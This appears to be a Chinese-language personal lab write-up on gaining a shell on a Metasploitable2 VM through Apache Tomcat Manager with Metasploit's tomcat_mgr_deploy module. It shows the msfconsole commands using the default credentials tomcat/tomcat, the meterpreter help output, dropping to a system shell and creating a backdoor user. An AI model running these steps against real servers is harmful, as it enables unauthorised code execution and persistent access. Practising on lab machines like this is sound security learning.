##Tomcat服务管理Web应用漏洞
0、工具
- metasploit3

1、这个漏洞是在搜索tomcat的时候看到的
```bash
[root@kali: ~#]msfconsole
msf > search tomcat
   exploit/multi/http/tomcat_mgr_deploy                2009-11-09       excellent  Apache Tomcat Manager Application Deployer Authenticated Code Execution
   exploit/multi/http/tomcat_mgr_upload                2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
#囧看到这两个模块就测试了下，结果果断的进入meterpreter
#先使用exploit/multi/http/tomcat_mgr_deploy
msf > use exploit/multi/http/tomcat_mgr_deploy
msf exploit(tomcat_mgr_deploy) > show options 

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                      yes       The target address
   RPORT     80               yes       The target port
   USERNAME                   no        The username to authenticate as
   VHOST                      no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic
#啥也不说先看看payloads   
msf exploit(tomcat_mgr_deploy) > show payloads 

Compatible Payloads
===================

   Name                            Disclosure Date  Rank    Description
   ----                            ---------------  ----    -----------
   generic/custom                                   normal  Custom Payload
   generic/shell_bind_tcp                           normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                        normal  Generic Command Shell, Reverse TCP Inline
   java/meterpreter/bind_tcp                        normal  Java Meterpreter, Java Bind TCP Stager
   java/meterpreter/reverse_http                    normal  Java Meterpreter, Java Reverse HTTP Stager
   java/meterpreter/reverse_https                   normal  Java Meterpreter, Java Reverse HTTPS Stager
   java/meterpreter/reverse_tcp                     normal  Java Meterpreter, Java Reverse TCP Stager
   java/shell/bind_tcp                              normal  Command Shell, Java Bind TCP Stager
   java/shell/reverse_tcp                           normal  Command Shell, Java Reverse TCP Stager
   java/shell_reverse_tcp                           normal  Java Command Shell, Reverse TCP Inline
#囧，载荷这么多，啥也不管默认自动
#设置RHOS
msf exploit(tomcat_mgr_deploy) > set RHOST metasploitable2
#账号密码，就是刚刚暴力破解出来的，默认就是tomcat
msf exploit(tomcat_mgr_deploy) > set USERNAME tomcat
msf exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
msf exploit(tomcat_mgr_deploy) > set RPORT 8180
msf exploit(tomcat_mgr_deploy) > exploit
#果断的进入了meterpreter
#我第一次接触这个，也没用过这个模块，搜索下，结果网上给解释说：
#meterpreter是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。
#使用它作为攻击载荷能够获得目标系统的一个meterpretershell的链接
#好吧！！！！ 先看help信息再说，metasploit 有个help指令
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information about active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    help                      Help menu
    info                      Displays information about a Post module
    interact                  Interacts with a channel
    irb                       Drop into irb scripting mode
    load                      Load one or more meterpreter extensions
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    use                       Deprecated alias for 'load'
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    portfwd       Forward a local port to a remote service
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values
    getuid        Get the user that the server is running as
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command       Description
    -------       -----------
    screenshot    Grab a screenshot of the interactive desktop


Stdapi: Webcam Commands
=======================

    Command       Description
    -------       -----------
    record_mic    Record audio from the default microphone for X seconds

#这么多命令，我去，找到一个进入system command shell
meterpreter > shell
meterpreter > shell
Process 1 created.
Channel 1 created.
ls
#列出了metasploitable2上的目录
#果断创建hacktest用户.
#然后用ssh 去连接试试看成功没有？
...
```
2、还有个`tomcat_mgr_upload`可以利用？

跟上面的操作一样的~~~

ps: 网上搜索一下tomcat5.5版本的漏洞。。。。